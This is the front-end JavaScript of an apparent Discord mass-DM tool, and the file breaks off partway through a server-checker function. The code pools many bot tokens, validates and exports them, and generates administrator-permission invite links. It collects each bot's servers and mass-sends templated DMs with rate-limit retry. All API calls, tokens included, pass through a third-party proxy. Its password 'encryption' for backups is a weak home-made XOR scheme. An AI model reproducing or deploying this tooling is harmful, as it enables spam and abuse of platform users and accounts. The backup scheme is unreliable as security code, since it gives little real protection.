const S = {
  get: k => { try { return JSON.parse(localStorage.getItem(k)); } catch { return null; } },
  set: (k, v) => localStorage.setItem(k, JSON.stringify(v)),
};

let tokens      = S.get('tokens')      || [];
let tokenMeta   = S.get('tokenMeta')   || {};
let dmMessage   = S.get('dmMessage')   || '';
let dmDelay     = parseFloat(S.get('dmDelay') || '1');
let actLog      = S.get('actLog')      || [];
let statSent = 0, statFailed = 0;
let dmRunning = false, dmStop = false, dmPaused = false;
let dmEtaInterval = null, dmEtaStartTime = 0, dmEtaTotal = 0, dmEtaDone = 0;
let tokenStatus  = S.get('tokenStatus')  || {};
let serverCache  = S.get('serverCache')  || {};
let templates    = S.get('templates')    || [];
let skipList       = S.get('skipList')       || [];
let serverSkipList = S.get('serverSkipList') || [];
let webhookHistory = S.get('webhookHistory') || [];
let tokenStats = {};
let tokenFilter = 'all';

const DISCORD = 'https://discord.com/api/v10';
const PROXY   = url => `https://super-unit-b274.60uhsss.workers.dev/?url=${encodeURIComponent(url)}`;

// ── Modal helpers ──────────────────────────────────────────────
function modalShow(msg, buttons) {
  document.getElementById('modal-msg').textContent = msg;
  const a = document.getElementById('modal-actions');
  a.innerHTML = '';
  buttons.forEach(b => {
    const el = document.createElement('button');
    el.textContent = b.label;
    el.className = b.primary ? 'btn-run' : 'btn-ghost';
    el.onclick = () => { modalClose(); b.action && b.action(); };
    a.appendChild(el);
  });
  document.getElementById('modal').classList.add('open');
}
function modalClose() {
  document.getElementById('modal').classList.remove('open');
  const injected = document.querySelector('#modal-msg + input, #modal-msg + textarea');
  if (injected) injected.remove();
}
function modalAlert(msg) { modalShow(msg, [{ label: 'ok', primary: true }]); }
function modalConfirm(msg, onYes) {
  modalShow(msg, [
    { label: 'cancel' },
    { label: 'confirm', primary: true, action: onYes },
  ]);
}
function modalPrompt(msg, defaultVal, onSubmit) {
  document.getElementById('modal-msg').textContent = msg;
  const a = document.getElementById('modal-actions');
  a.innerHTML = '';
  const input = document.createElement('input');
  input.type = 'text'; input.value = defaultVal || '';
  input.style.cssText = 'width:100%;margin-bottom:12px;background:var(--bg);border:1px solid var(--border2);color:var(--text);padding:8px 10px;border-radius:3px;font-family:inherit;font-size:12.5px;outline:none;';
  document.getElementById('modal-msg').after(input);
  input.focus(); input.select();
  const submit = () => { const v = input.value.trim(); modalClose(); if (v) onSubmit(v); };
  input.addEventListener('keydown', e => { if (e.key === 'Enter') submit(); if (e.key === 'Escape') modalClose(); });
  const cancelBtn = document.createElement('button'); cancelBtn.textContent = 'cancel'; cancelBtn.className = 'btn-ghost'; cancelBtn.onclick = () => modalClose();
  const okBtn = document.createElement('button'); okBtn.textContent = 'ok'; okBtn.className = 'btn-run'; okBtn.onclick = submit;
  a.appendChild(cancelBtn); a.appendChild(okBtn);
  document.getElementById('modal').classList.add('open');
}

// ── Init ───────────────────────────────────────────────────────
function init() {
  renderTokens(); updateBadge(); updateStats();
  document.getElementById('dm-message').value = dmMessage;
  document.getElementById('dm-delay').value   = dmDelay;
  syncPreviews();
  renderActivityLog();
  renderTemplates();
  renderSkipList();
  playAudio();
  restoreServerCache();
  applyTheme(S.get('theme') || 'dark');

  const savedPage = S.get('activePage') || 'massdm';
  const navBtn = document.querySelector(`#sidebar button[onclick="showPage('${savedPage}',this)"]`);
  if (navBtn) showPage(savedPage, navBtn);

  if (S.get('sidebarCollapsed')) document.getElementById('sidebar').classList.add('sidebar-collapsed');

  const autoCheckEl = document.getElementById('auto-check-toggle');
  if (autoCheckEl) autoCheckEl.checked = !!S.get('autoCheck');
  renderWebhookHistory();

  // keyboard shortcuts
  document.addEventListener('keydown', e => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
      if (document.getElementById('page-massdm').classList.contains('active') && !dmRunning) {
        const tab = document.querySelector('.tab.active');
        const mode = tab && tab.textContent.includes('global') ? 'global' : 'single';
        startMassDM(mode);
      }
    }
    if (e.key === 'Escape' && dmRunning) stopDM();
    if (e.key === ' ' && dmRunning && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
      e.preventDefault();
      dmPaused ? resumeDM() : pauseDM();
    }
  });
}

function playAudio() {
  const audio = document.getElementById('bg-audio');
  if (!audio) return;
  const vol = document.getElementById('bg-vol');
  const saved = S.get('bgVol');
  if (saved !== null && vol) { vol.value = saved; audio.volume = saved / 100; }
  const tryPlay = () => { audio.play().catch(() => {}); };
  tryPlay();
  document.addEventListener('click', tryPlay, { once: true });
}

function toggleSidebar() {
  const collapsed = document.getElementById('sidebar').classList.toggle('sidebar-collapsed');
  S.set('sidebarCollapsed', collapsed);
}

function showPage(id, btn) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('#sidebar button').forEach(b => b.classList.remove('active'));
  document.getElementById('page-' + id).classList.add('active');
  btn.classList.add('active');
  S.set('activePage', id);
  if (id === 'massdm') syncPreviews();
  closeAdminPanel();
}

function switchDMTab(tab, btn) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('dm-single').style.display = tab === 'single' ? '' : 'none';
  document.getElementById('dm-global').style.display = tab === 'global' ? '' : 'none';
}

function syncPreviews() {
  renderDMPreview();
}

function renderDMPreview() {
  const contentEl = document.getElementById('dm-preview-content');
  const embedWrap = document.getElementById('dm-preview-embed-wrap');
  if (!contentEl) return;

  const fakeUser = { id: '325563836893626369', username: 'ajsdkf', guildName: 'cool server' };
  const previewText = applyVars(dmMessage, fakeUser);
  contentEl.textContent = previewText;
  contentEl.style.display = previewText ? '' : 'none';

  const useEmbed = document.getElementById('dm-use-embed')?.checked;
  if (!useEmbed) { embedWrap.style.display = 'none'; return; }

  embedWrap.style.display = '';
  const color      = document.getElementById('eb-color')?.value || '#7b68ee';
  const title      = document.getElementById('eb-title')?.value.trim() || '';
  const desc       = document.getElementById('eb-desc')?.value.trim() || '';
  const url        = document.getElementById('eb-url')?.value.trim() || '';
  const authorName = document.getElementById('eb-author-name')?.value.trim() || '';
  const authorIcon = document.getElementById('eb-author-icon')?.value.trim() || '';
  const thumbnail  = document.getElementById('eb-thumbnail')?.value.trim() || '';
  const image      = document.getElementById('eb-image')?.value.trim() || '';
  const footerText = document.getElementById('eb-footer-text')?.value.trim() || '';
  const footerIcon = document.getElementById('eb-footer-icon')?.value.trim() || '';

  document.getElementById('dm-de-pill').style.background = color;

  const authorEl = document.getElementById('dm-de-author');
  if (authorName) {
    authorEl.style.display = 'flex';
    document.getElementById('dm-de-author-name').textContent = authorName;
    const ai = document.getElementById('dm-de-author-icon');
    if (authorIcon) { ai.src = authorIcon; ai.style.display = ''; } else ai.style.display = 'none';
  } else authorEl.style.display = 'none';

  const titleEl = document.getElementById('dm-de-title');
  if (title) { titleEl.innerHTML = url ? `<a href="${esc(url)}" target="_blank">${esc(title)}</a>` : esc(title); titleEl.style.display = ''; }
  else titleEl.style.display = 'none';

  const descEl = document.getElementById('dm-de-desc');
  descEl.textContent = desc; descEl.style.display = desc ? '' : 'none';

  const imgEl = document.getElementById('dm-de-image');
  if (image) { imgEl.src = image; imgEl.style.display = ''; } else imgEl.style.display = 'none';

  const thumbEl = document.getElementById('dm-de-thumbnail');
  if (thumbnail) { thumbEl.src = thumbnail; thumbEl.style.display = ''; } else thumbEl.style.display = 'none';

  const footerEl = document.getElementById('dm-de-footer');
  if (footerText) {
    footerEl.style.display = 'flex';
    document.getElementById('dm-de-footer-text').textContent = footerText;
    const fi = document.getElementById('dm-de-footer-icon');
    if (footerIcon) { fi.src = footerIcon; fi.style.display = ''; } else fi.style.display = 'none';
  } else footerEl.style.display = 'none';
}

// ── Theme ──────────────────────────────────────────────────────
function applyTheme(t) {
  document.documentElement.setAttribute('data-theme', t);
  S.set('theme', t);
  const btn = document.getElementById('theme-toggle');
  if (btn) btn.textContent = t === 'dark' ? '☀' : '☾';
}
function toggleTheme() {
  applyTheme((S.get('theme') || 'dark') === 'dark' ? 'light' : 'dark');
}

// ── Settings export/import (password-encrypted) ───────────────

// Pure-JS key stream — works on file://, http://, https:// alike
function makeKeyStream(passphrase, length) {
  // simple seeded PRNG (mulberry32) seeded from passphrase char codes
  let seed = 0;
  for (let i = 0; i < passphrase.length; i++) {
    seed = (seed + passphrase.charCodeAt(i) * (i + 1)) >>> 0;
  }
  function next() {
    seed += 0x6D2B79F5;
    let z = seed;
    z = Math.imul(z ^ (z >>> 15), z | 1);
    z ^= z + Math.imul(z ^ (z >>> 7), z | 61);
    return ((z ^ (z >>> 14)) >>> 0) & 0xFF;
  }
  const key = new Uint8Array(length);
  for (let i = 0; i < length; i++) key[i] = next();
  return key;
}

function encryptBackup(plaintext, passphrase) {
  const bytes = [];
  for (let i = 0; i < plaintext.length; i++) {
    bytes.push(plaintext.charCodeAt(i) & 0xFF);
    // handle multi-byte chars
    if (plaintext.charCodeAt(i) > 0xFF) bytes.push((plaintext.charCodeAt(i) >> 8) & 0xFF);
  }
  // encode to utf-8 bytes properly
  const enc = new TextEncoder();
  const data = enc.encode(plaintext);
  const key  = makeKeyStream(passphrase, data.length);
  const xored = new Uint8Array(data.length);
  for (let i = 0; i < data.length; i++) xored[i] = data[i] ^ key[i];
  // base64
  let bin = '';
  xored.forEach(b => bin += String.fromCharCode(b));
  return btoa(bin);
}

function decryptBackup(ciphertext, passphrase) {
  const bin  = atob(ciphertext);
  const data = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) data[i] = bin.charCodeAt(i);
  const key  = makeKeyStream(passphrase, data.length);
  const xored = new Uint8Array(data.length);
  for (let i = 0; i < data.length; i++) xored[i] = data[i] ^ key[i];
  return new TextDecoder().decode(xored);
}

function triggerDownload(content, filename) {
  const blob = new Blob([content], { type: 'application/octet-stream' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 2000);
}

function exportSettings() {
  modalPrompt('set a password for this backup:', '', pass => {
    try {
      const data     = { tokens, tokenMeta, tokenStatus, dmMessage, dmDelay, templates, skipList, serverSkipList, serverCache, actLog };
      const json     = JSON.stringify(data);
      const cipher   = encryptBackup(json, pass);
      const envelope = JSON.stringify({ v: 1, enc: cipher });
      triggerDownload(envelope, `massdm-backup-${Date.now()}.mdmbak`);
    } catch(e) {
      modalAlert('export failed: ' + e.message);
    }
  });
}

function importSettings() {
  const input = document.createElement('input');
  input.type = 'file'; input.accept = '.mdmbak,.json';
  input.onchange = e => {
    const file = e.target.files[0]; if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      try {
        const envelope = JSON.parse(ev.target.result);
        if (envelope.v === 1 && envelope.enc) {
          modalPrompt('enter backup password:', '', pass => {
            try {
              const plain = decryptBackup(envelope.enc, pass);
              applyBackup(JSON.parse(plain));
            } catch { modalAlert('wrong password or corrupted backup.'); }
          });
        } else {
          applyBackup(envelope);
        }
      } catch { modalAlert('invalid backup file.'); }
    };
    reader.readAsText(file);
  };
  input.click();
}

function applyBackup(d) {
  if (d.tokens)      { tokens = d.tokens; S.set('tokens', tokens); }
  if (d.tokenMeta)   { tokenMeta = d.tokenMeta; S.set('tokenMeta', tokenMeta); }
  if (d.tokenStatus) { tokenStatus = d.tokenStatus; S.set('tokenStatus', tokenStatus); }
  if (d.dmMessage)   { dmMessage = d.dmMessage; S.set('dmMessage', dmMessage); document.getElementById('dm-message').value = dmMessage; }
  if (d.dmDelay)     { dmDelay = d.dmDelay; S.set('dmDelay', dmDelay); document.getElementById('dm-delay').value = dmDelay; }
  if (d.templates)   { templates = d.templates; saveTemplates(); }
  if (d.skipList)    { skipList = d.skipList; S.set('skipList', skipList); renderSkipList(); }
  if (d.serverSkipList) { serverSkipList = d.serverSkipList; S.set('serverSkipList', serverSkipList); renderSkipList(); }
  if (d.serverCache) { serverCache = d.serverCache; S.set('serverCache', serverCache); restoreServerCache(); }
  if (d.actLog)      { actLog = d.actLog; S.set('actLog', actLog); renderActivityLog(); }
  renderTokens(); updateBadge(); updateStats(); syncPreviews();
  modalAlert('settings imported.');
}

// ── Tokens ─────────────────────────────────────────────────────
function saveTokens() {
  S.set('tokens', tokens);
  Object.keys(tokenMeta).forEach(k => { if (!tokens.includes(k)) delete tokenMeta[k]; });
  S.set('tokenMeta', tokenMeta);
  updateBadge(); renderTokens(); updateStats();
}

function addToken() {
  const v = document.getElementById('new-token').value.trim();
  if (!v) return;
  if (tokens.includes(v)) { modalAlert('already added.'); return; }
  tokens.push(v);
  document.getElementById('new-token').value = '';
  saveTokens();
  log('info', `[+] Token added (${mask(v)})`);
  if (S.get('autoCheck')) validateSingleToken(tokens.length - 1);
}

function copyToken(i) {
  navigator.clipboard.writeText(tokens[i]).then(() => {
    const btn = document.querySelectorAll('.token-item')[i]?.querySelector('[onclick^="copyToken"]');
    if (btn) { btn.textContent = '✓'; setTimeout(() => btn.textContent = '⎘', 1200); }
  });
}

function getInviteUrl(clientId) {
  return `https://discord.com/oauth2/authorize?client_id=${clientId}&permissions=8&scope=bot`;
}

function copyInvite(clientId) {
  const url = getInviteUrl(clientId);
  navigator.clipboard.writeText(url).then(() => flashNotify('invite link copied'));
}

function removeToken(i) {
  log('warn', `[-] Removed (${mask(tokens[i])})`);
  tokens.splice(i, 1);
  saveTokens();
}

function bulkImport() {
  const lines = document.getElementById('bulk-tokens').value.split('\n').map(l => l.trim()).filter(Boolean);
  const newIndices = [];
  lines.forEach(t => {
    if (!tokens.includes(t)) { tokens.push(t); newIndices.push(tokens.length - 1); }
  });
  document.getElementById('bulk-tokens').value = '';
  saveTokens();
  log('info', `[+] Imported ${newIndices.length} token(s)`);
  if (S.get('autoCheck')) newIndices.forEach(i => validateSingleToken(i));
}

function clearTokens() {
  modalConfirm('remove all tokens?', () => {
    tokens = []; tokenMeta = {}; tokenStatus = {};
    S.set('tokenMeta', {}); S.set('tokenStatus', {});
    saveTokens();
    log('warn', '[-] all tokens cleared');
  });
}

function exportTokens() {
  const valid = tokens.filter(t => tokenStatus[t] === 'valid');
  if (!valid.length) { modalAlert('no valid tokens to export.'); return; }
  const blob = new Blob([valid.join('\n')], { type: 'text/plain' });
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
  a.download = 'valid-tokens.txt'; a.click();
}

function copyValidTokens() {
  const valid = tokens.filter(t => tokenStatus[t] === 'valid');
  if (!valid.length) { modalAlert('no valid tokens.'); return; }
  navigator.clipboard.writeText(valid.join('\n')).then(() => modalAlert(`copied ${valid.length} valid token(s).`));
}

function setTokenFilter(f, btn) {
  tokenFilter = f;
  document.querySelectorAll('.filter-tab').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  renderTokens();
}

function mask(t) { return t.length > 12 ? t.slice(0,6)+'...'+t.slice(-4) : '***'; }

function renderTokens() {
  const el = document.getElementById('token-list');
  let list = tokens;
  if (tokenFilter === 'valid')   list = tokens.filter(t => tokenStatus[t] === 'valid');
  if (tokenFilter === 'invalid') list = tokens.filter(t => tokenStatus[t] === 'invalid');
  if (tokenFilter === 'pending') list = tokens.filter(t => !tokenStatus[t] || tokenStatus[t] === 'pending');
  if (tokenFilter === 'limited') list = tokens.filter(t => tokenStatus[t] === 'limited');
  if (!list.length) { el.innerHTML = '<p class="empty">no tokens.</p>'; return; }
  el.innerHTML = list.map((t) => {
    const i = tokens.indexOf(t);
    const meta   = tokenMeta[t];
    const status = tokenStatus[t] || 'pending';
    const initial = meta ? meta.username[0].toUpperCase() : '?';
    const avatarHtml = (meta && meta.avatarUrl)
      ? `<img class="bot-avatar" src="${meta.avatarUrl}" onerror="this.outerHTML='<div class=bot-avatar-placeholder>${initial}</div>'">`
      : `<div class="bot-avatar-placeholder">${initial}</div>`;
    const nameHtml = meta
      ? `<span class="bot-name">${esc(meta.username)}</span>`
      : `<span class="token-val">${mask(t)}</span>`;
    const statsHtml = tokenStats[t]
      ? `<span class="token-stat dim-text">${tokenStats[t].sent}↑ ${tokenStats[t].failed}↓</span>`
      : '';
    const statusLabel = status === 'pending' ? '—' : status === 'limited' ? '⚠ limited' : status;
    return `<div class="token-item">
      ${avatarHtml}${nameHtml}${statsHtml}
      <span class="status status-${status}" id="ts-${i}">${statusLabel}</span>
      <button class="btn-ghost btn-xs" onclick="copyToken(${i})" title="copy token">⎘</button>
      ${meta ? `<button class="btn-ghost btn-xs" onclick="copyInvite('${meta.id}')" title="copy invite link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="12" height="12"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></button>` : ''}
      <button class="btn-ghost btn-xs" onclick="removeToken(${i})">✕</button>
    </div>`;
  }).join('');
}

function makeInitialAvatar(letter) {
  const d = document.createElement('div');
  d.className = 'bot-avatar-placeholder';
  d.textContent = letter;
  return d;
}

function updateTokenItem(i, token, statusType) {
  const list = document.getElementById('token-list');
  const items = list.querySelectorAll('.token-item');
  if (!items[i]) return;
  const meta = tokenMeta[token];
  if (!meta) return;
  const item = items[i];
  const oldAvatar = item.querySelector('.bot-avatar, .bot-avatar-placeholder');
  const initial = meta.username[0].toUpperCase();
  if (meta.avatarUrl) {
    const img = document.createElement('img');
    img.className = 'bot-avatar'; img.src = meta.avatarUrl;
    img.onerror = function() { this.replaceWith(makeInitialAvatar(initial)); };
    if (oldAvatar) oldAvatar.replaceWith(img); else item.prepend(img);
  } else {
    const ph = makeInitialAvatar(initial);
    if (oldAvatar) oldAvatar.replaceWith(ph); else item.prepend(ph);
  }
  const oldName = item.querySelector('.token-val, .bot-name');
  const nameEl = document.createElement('span');
  nameEl.className = 'bot-name'; nameEl.textContent = meta.username;
  if (oldName) oldName.replaceWith(nameEl);
  const badge = document.getElementById('ts-' + i);
  if (badge) { badge.textContent = statusType; badge.className = `status status-${statusType}`; }
}

function updateBadge() {
  const txt = tokens.length + ' token' + (tokens.length !== 1 ? 's' : '');
  document.getElementById('token-count-badge-top').textContent = txt;
  const lc = document.getElementById('token-list-count');
  if (lc) lc.textContent = tokens.length;
}

// ── Message / Templates ────────────────────────────────────────
function saveMessage() {
  dmMessage = document.getElementById('dm-message').value;
  dmDelay   = parseFloat(document.getElementById('dm-delay').value) || 1;
  S.set('dmMessage', dmMessage); S.set('dmDelay', dmDelay);
  syncPreviews();
  const el = document.getElementById('msg-saved');  el.style.display = 'block';
  setTimeout(() => el.style.display = 'none', 2000);
  log('info', '[~] Message saved');
}

function saveTemplates() { S.set('templates', templates); renderTemplates(); }

function saveMessageAs() {
  const content = document.getElementById('dm-message').value.trim();
  if (!content) { modalAlert('write a message first.'); return; }
  modalPrompt('template name:', '', name => {
    const tag = document.getElementById('tpl-tag-input')?.value.trim() || '';
    templates.push({ id: Date.now(), name, content, tag });
    saveTemplates();
  });
}

function loadTemplate(id) {
  const t = templates.find(t => t.id === id);
  if (!t) return;
  document.getElementById('dm-message').value = t.content;
}

function editTemplate(id) {
  const t = templates.find(t => t.id === id);
  if (!t) return;
  modalPrompt('rename template:', t.name, name => { t.name = name; saveTemplates(); });
}

function deleteTemplate(id) {
  modalConfirm('delete this template?', () => {
    templates = templates.filter(t => t.id !== id);
    saveTemplates();
  });
}

function renderTemplates() {
  const el = document.getElementById('tpl-list');
  const count = document.getElementById('tpl-count');
  if (!el) return;
  count.textContent = templates.length;
  const filterTag = document.getElementById('tpl-filter')?.value.trim().toLowerCase() || '';
  const list = filterTag ? templates.filter(t => (t.tag || '').toLowerCase().includes(filterTag) || t.name.toLowerCase().includes(filterTag)) : templates;
  if (!list.length) { el.innerHTML = '<p class="empty">no templates saved.</p>'; return; }
  el.innerHTML = list.map(t => `
    <div class="tpl-item">
      <div class="tpl-name" onclick="loadTemplate(${t.id})" title="click to load">${esc(t.name)}${t.tag ? `<span class="tpl-tag-badge">${esc(t.tag)}</span>` : ''}</div>
      <div class="tpl-preview">${esc(t.content.slice(0, 80))}${t.content.length > 80 ? '…' : ''}</div>
      <div class="tpl-actions">
        <button class="btn-ghost btn-xs" onclick="loadTemplate(${t.id})">load</button>
        <button class="btn-ghost btn-xs" onclick="editTemplate(${t.id})">rename</button>
        <button class="btn-del btn-xs" onclick="deleteTemplate(${t.id})">✕</button>
      </div>
    </div>`).join('');
}

// ── Skip list ──────────────────────────────────────────────────
function switchSkipTab(tab, btn) {
  document.querySelectorAll('#page-message .tab').forEach(t => t.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('skip-tab-users').style.display   = tab === 'users'   ? '' : 'none';
  document.getElementById('skip-tab-servers').style.display = tab === 'servers' ? '' : 'none';
}

function renderSkipList() {
  const userEl   = document.getElementById('skip-list-display');
  const serverEl = document.getElementById('skip-server-list-display');
  const uc = document.getElementById('skip-user-count');
  const sc = document.getElementById('skip-server-count');
  if (uc) uc.textContent = skipList.length;
  if (sc) sc.textContent = serverSkipList.length;

  if (userEl) {
    if (!skipList.length) { userEl.innerHTML = '<p class="empty">no users skipped.</p>'; }
    else userEl.innerHTML = skipList.map((id, i) => `
      <div class="token-item">
        <span class="token-val">${esc(id)}</span>
        <button class="btn-ghost btn-xs" onclick="removeSkip(${i},'user')">✕</button>
      </div>`).join('');
  }
  if (serverEl) {
    if (!serverSkipList.length) { serverEl.innerHTML = '<p class="empty">no servers skipped.</p>'; }
    else serverEl.innerHTML = serverSkipList.map((id, i) => `
      <div class="token-item">
        <span class="token-val">${esc(id)}</span>
        <button class="btn-ghost btn-xs" onclick="removeSkip(${i},'server')">✕</button>
      </div>`).join('');
  }
}

function addSkipIds(type = 'user') {
  const inputId = type === 'server' ? 'skip-server-input' : 'skip-input';
  const raw = document.getElementById(inputId).value.trim();
  if (!raw) return;
  const ids = raw.split(/[\n,\s]+/).map(s => s.trim()).filter(Boolean);
  let added = 0;
  if (type === 'server') {
    ids.forEach(id => { if (!serverSkipList.includes(id)) { serverSkipList.push(id); added++; } });
    document.getElementById(inputId).value = '';
    S.set('serverSkipList', serverSkipList);
  } else {
    ids.forEach(id => { if (!skipList.includes(id)) { skipList.push(id); added++; } });
    document.getElementById(inputId).value = '';
    S.set('skipList', skipList);
  }
  renderSkipList();
  log('info', `[~] Added ${added} ${type} id(s) to skip list`);
}

function removeSkip(i, type = 'user') {
  if (type === 'server') { serverSkipList.splice(i, 1); S.set('serverSkipList', serverSkipList); }
  else { skipList.splice(i, 1); S.set('skipList', skipList); }
  renderSkipList();
}

function clearSkipList(type = 'user') {
  modalConfirm(`clear ${type} skip list?`, () => {
    if (type === 'server') { serverSkipList = []; S.set('serverSkipList', serverSkipList); }
    else { skipList = []; S.set('skipList', skipList); }
    renderSkipList();
  });
}

// ── Stats / Log ────────────────────────────────────────────────
function updateStats() {
  document.getElementById('stat-sent').textContent   = statSent;
  document.getElementById('stat-failed').textContent = statFailed;
  document.getElementById('stat-tokens').textContent = tokens.length;
}
function setStatus(s) { document.getElementById('stat-status').textContent = s; }
function setProgress(p) { document.getElementById('dm-progress').style.width = Math.min(100, p) + '%'; }

function log(type, msg) {
  const ts = new Date().toLocaleTimeString();
  actLog.push({ type, msg, ts });
  if (actLog.length > 500) actLog.shift();
  S.set('actLog', actLog);
  const line = `<div class="log-line log-${type}">[${ts}] ${esc(msg)}</div>`;
  const d = document.getElementById('dm-log');
  const a = document.getElementById('activity-log');
  if (d) { d.innerHTML += line; d.scrollTop = d.scrollHeight; }
  if (a) { a.innerHTML += line; a.scrollTop = a.scrollHeight; }
}

function clearLog() {
  actLog = []; S.set('actLog', []);
  document.getElementById('activity-log').innerHTML = '<div class="log-line log-info">[~] Cleared.</div>';
  document.getElementById('dm-log').innerHTML       = '<div class="log-line log-info">[~] Ready.</div>';
}

function exportLog() {
  const text = actLog.map(e => `[${e.ts}] ${e.msg}`).join('\n');
  const blob = new Blob([text], { type: 'text/plain' });
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
  a.download = `massdm-log-${Date.now()}.txt`; a.click();
}

function exportLogCSV() {
  const rows = [['time','type','message'], ...actLog.map(e => [e.ts, e.type, e.msg])];
  const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n');
  const blob = new Blob([csv], { type: 'text/csv' });
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
  a.download = `massdm-log-${Date.now()}.csv`; a.click();
}

function renderActivityLog() {
  const el = document.getElementById('activity-log');
  if (!actLog.length) { el.innerHTML = '<div class="log-line log-info">[~] No activity yet.</div>'; return; }
  el.innerHTML = actLog.map(e => `<div class="log-line log-${e.type}">[${e.ts}] ${esc(e.msg)}</div>`).join('');
  el.scrollTop = el.scrollHeight;
}

function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

// ── Discord API helpers ────────────────────────────────────────
async function dGet(path, token) {
  const r = await fetch(PROXY(`${DISCORD}${path}`), {
    headers: { Authorization: `Bot ${token}` },
  });
  if (r.status === 429) {
    let retryAfter = 1;
    try { const b = await r.json(); retryAfter = (b.retry_after || 1); } catch {}
    log('warn', `[~] Rate limited — waiting ${retryAfter.toFixed(1)}s`);
    await sleep(retryAfter * 1000 + 200);
    return dGet(path, token);
  }
  if (!r.ok) { let b = ''; try { b = JSON.stringify(await r.json()); } catch {} throw new Error(`HTTP ${r.status} ${b}`); }
  return r.json();
}

async function dPost(path, token, body) {
  const r = await fetch(PROXY(`${DISCORD}${path}`), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bot ${token}` },
    body: JSON.stringify(body),
  });
  if (r.status === 429) {
    let retryAfter = 1;
    try { const b = await r.clone().json(); retryAfter = (b.retry_after || 1); } catch {}
    log('warn', `[~] Rate limited — waiting ${retryAfter.toFixed(1)}s`);
    await sleep(retryAfter * 1000 + 200);
    return dPost(path, token, body);
  }
  return r;
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// pause-aware sleep: respects dmPaused and dmStop
async function sleepDM(ms) {
  const step = 100;
  let elapsed = 0;
  while (elapsed < ms) {
    if (dmStop) return;
    while (dmPaused && !dmStop) await sleep(150);
    await sleep(Math.min(step, ms - elapsed));
    elapsed += step;
  }
}

// ── ETA helpers ─────────────────────────────────────────────────
function etaStart(total) {
  dmEtaTotal = total; dmEtaDone = 0; dmEtaStartTime = Date.now();
  const bar = document.getElementById('dm-eta-bar');
  const el  = document.getElementById('dm-eta');
  if (bar) bar.style.display = '';
  if (el)  el.textContent = 'eta: calculating...';
  if (dmEtaInterval) clearInterval(dmEtaInterval);
  dmEtaInterval = setInterval(etaTick, 1000);
}
function etaTick() {
  const el = document.getElementById('dm-eta');
  if (!el) return;
  if (!dmRunning || dmEtaDone === 0) { el.textContent = 'eta: calculating...'; return; }
  if (dmPaused) { el.textContent = el.textContent.replace(' ⏸', '') + ' ⏸'; return; }
  const elapsed = (Date.now() - dmEtaStartTime) / 1000;
  const rate = dmEtaDone / elapsed;
  const remaining = dmEtaTotal - dmEtaDone;
  const secsLeft = rate > 0 ? Math.round(remaining / rate) : 0;
  el.textContent = `eta: ${fmtSecs(secsLeft)} (${dmEtaDone}/${dmEtaTotal})`;
}
function etaStop() {
  if (dmEtaInterval) { clearInterval(dmEtaInterval); dmEtaInterval = null; }
  const bar = document.getElementById('dm-eta-bar');
  if (bar) bar.style.display = 'none';
}
function fmtSecs(s) {
  if (s < 60) return `${s}s`;
  if (s < 3600) return `${Math.floor(s/60)}m ${s%60}s`;
  return `${Math.floor(s/3600)}h ${Math.floor((s%3600)/60)}m`;
}

// ── Notification flash ─────────────────────────────────────────
function flashNotify(msg) {
  let container = document.getElementById('notify-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'notify-container';
    document.body.appendChild(container);
  }
  const toast = document.createElement('div');
  toast.className = 'notify-flash show';
  toast.textContent = msg;
  container.appendChild(toast);
  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

// ── Server checker ─────────────────────────────────────────────
let scRunning = false;

async function checkAllServers() {
  if (scRunning) return;
  if (!tokens.length) { modalAlert('no tokens loaded.'); return; }
  scRunning = true;
  const statusEl = document.getElementById('sc-status');
  const el       = document.getElementById('sc-result');
  el.innerHTML   = '<p class="dim-text">collecting guilds...</p>';
  document.getElementById('sc-count').textContent = '0';

  const guildTokenMap = {}, guildBotsMap = {};
  for (let i = 0; i < tokens.length; i++) {
    statusEl.textContent = `token ${i+1}/${tokens.length}...`;
    try {
      const guilds = await dGet('/users/@me/guilds', tokens[i]);
      for (const g of guilds) {
        if (!guildTokenMap[g.id]) guildTokenMap[g.id] = tokens[i];
        if (!guildBotsMap[g.id]) guildBotsMap[g.id] = [];
        guildBotsMap[g.id].push(tokens[i]);
      }
    } catch {}
    await sleep(300);
  }

  const guildIds = Object.keys(guildTokenMap);
  if (!guildIds.length) {
    el.innerHTML = '<p class="empty">no servers found.</p>';
    statusEl.textContent = ''; scRunning = false; return;
  }

  el.innerHTML = ''; let fetched = 0;
  for (const gid of guildIds) {
    statusEl.textContent = `fetching ${fetched+1}/${guildIds.length}...`;
    try {
      const guild = await dGet(`/guilds/${gid}?with_counts=true`, guildTokenMap[gid]);
      guild._bots = guildBotsMap[gid] || [];
      // resolve owner username
      try {
        const owner = await dGet(`/users/${guild.owner_id}`, guildTokenMap[gid]);
        guild._owner_username = owner.username;
      } catch { guild._owner_username = null; }
      serverCache[gid] = guild;
      fetched++;
      document.getElementById('sc-count').textContent = fetched;
      renderServerResults();
      updateTotalMembers();
    } catch {}
    await sleep(300);
  }

  S.set('serverCache', serverCache);
  statusEl.textContent = '';
